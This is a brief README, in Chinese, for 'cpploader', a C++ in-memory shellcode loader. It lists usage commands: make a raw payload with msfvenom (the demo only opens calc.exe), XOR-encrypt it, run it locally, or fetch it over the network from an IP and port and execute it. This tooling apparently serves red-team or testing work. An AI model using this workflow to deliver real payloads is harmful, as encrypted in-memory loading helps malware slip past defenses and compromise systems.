# cpploader

shellcode 内存加载器 C++编写.

## usage

生成 payload

```
msfvenom -p windows/exec CMD=calc.exe -f raw -o calc.bin
```

加密 payload (默认 xor)

```
cppencoder.exe calc.bin enc.bin
```

`cpploader` 本地执行.

```
cpploader.exe enc.bin
```

`cppnerloader` 网络执行.

```
cppnetloader.exe 192.168.1.1 5555
```
